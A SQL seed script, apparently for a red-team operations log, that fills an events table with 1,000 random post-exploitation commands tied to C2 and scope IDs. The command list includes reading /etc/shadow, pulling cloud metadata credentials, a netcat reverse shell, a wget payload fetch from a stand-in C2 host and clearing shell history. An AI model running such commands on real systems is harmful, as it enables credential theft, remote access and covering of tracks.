-- generate test data (from gemini)
INSERT INTO events (command, user_id, c2_id, scope_id, time)
SELECT
    -- Pick a random red-teamer command and append random arguments/targets
    (ARRAY[
        'netstat -antp',
        'cat /etc/shadow',
        'find / -perm -4000 -type f 2>/dev/null',
        'curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/',
        'ps -ef --forest',
        'ls -laR /home/',
        'sudo -l',
        'grep -r "password" /var/www/html/',
        'nc -e /bin/sh 10.0.0.' || (floor(random() * 254) + 1)::text || ' 4444',
        'crontab -l',
        'whoami /all',
        'python3 -c ''import pty; pty.spawn("/bin/bash")''',
        'wget http://c2-server.com/payload.sh -O /tmp/payload.sh',
        'ssh-keygen -t rsa -b 4096 -f ~/.ssh/id_rsa -N ""',
        'export HISTCONTROL=ignoredups',
        'history -c',
        'base64 /etc/passwd | head -n 5',
        'docker images',
        'kubectl get pods --all-namespaces',
        'tcpdump -i eth0 -c 10'
        ])[floor(random() * 20) + 1] || ' --tag=' || (floor(random() * 999))::text,

    -- Randomly assign foreign keys based on your constraints
    floor(random() * 6) + 1, -- user_id 1-6
    floor(random() * 4) + 1, -- c2_id 1-4
    floor(random() * 5) + 1, -- scope_id 1-5

    -- Stagger the timestamps over the last 24 hours
    now() - (random() * interval '24 hours')
FROM generate_series(1, 1000);